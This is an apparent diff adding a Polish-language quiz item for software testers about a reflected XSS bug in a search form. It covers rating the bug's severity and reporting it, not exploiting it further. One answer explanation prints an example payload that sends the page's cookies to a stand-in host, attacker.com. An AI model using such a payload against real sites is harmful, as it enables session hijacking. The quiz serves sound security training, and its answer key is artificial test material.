@@ -1,0 +1,30 @@
+{
+  "type": "quiz",
+  "question": "Testujesz formularz wyszukiwania. Wpisujesz: `<script>alert('XSS')</script>` i w przeglądarce pojawia się okno alertu z napisem 'XSS'. Co to oznacza i jak priorytetyzujesz ten bug?",
+  "options": [
+    {
+      "id": "a",
+      "text": "To kosmetyczny błąd — alert nie robi nic złego. Priorytet: low.",
+      "is_correct": false,
+      "explanation": "Błąd. Jeśli alert działa, oznacza to że aplikacja wykonuje JavaScript wstrzyknięty przez użytkownika. Atakujący może użyć tego do kradzieży cookies/sesji, przekierowania na phishing, lub wykonania działań w imieniu zalogowanego użytkownika. To jest XSS (Cross-Site Scripting) — OWASP A03, priority: critical."
+    },
+    {
+      "id": "b",
+      "text": "To Reflected XSS — krytyczny błąd bezpieczeństwa. Priorytet: critical/blocker. Atakujący może ukraść sesję użytkownika przez spreparowany link.",
+      "is_correct": true,
+      "explanation": "Poprawnie. Reflected XSS to podatność klasy OWASP A03. Atakujący tworzy URL z payload JavaScript: `https://shop.com/search?q=<script>document.location='attacker.com/steal?c='+document.cookie</script>`. Użytkownik klika link, skrypt kradnie cookie/sesję. W aplikacjach z danymi finansowymi lub medycznymi: critical blocker, nie wolno releasować."
+    },
+    {
+      "id": "c",
+      "text": "Testujesz dalej z poważniejszymi payloadami żeby sprawdzić jak głęboko sięga podatność.",
+      "is_correct": false,
+      "explanation": "Nie. Twoim zadaniem jest udokumentowanie i zgłoszenie podatności — nie jej eksploatacja. Próba głębszej penetracji bez autoryzacji jest nieetyczna i może być nielegalna (nawet w swoim środowisku testowym, jeśli nie masz wyraźnego pozwolenia na pentest). Zgłoś co znalazłeś i eskaluj do security team."
+    },
+    {
+      "id": "d",
+      "text": "Zgłaszasz do PM i czekasz na jego decyzję czy to ważne.",
+      "is_correct": false,
+      "explanation": "PM zazwyczaj nie ma wiedzy technicznej by ocenić severity podatności bezpieczeństwa. XSS należy eskalować do tech lead lub security team z opisem impact — nie do PM jako decydenta priority. PM może zdecydować o terminie naprawy, ale nie o tym czy jest to poważne."
+    }
+  ]
+}
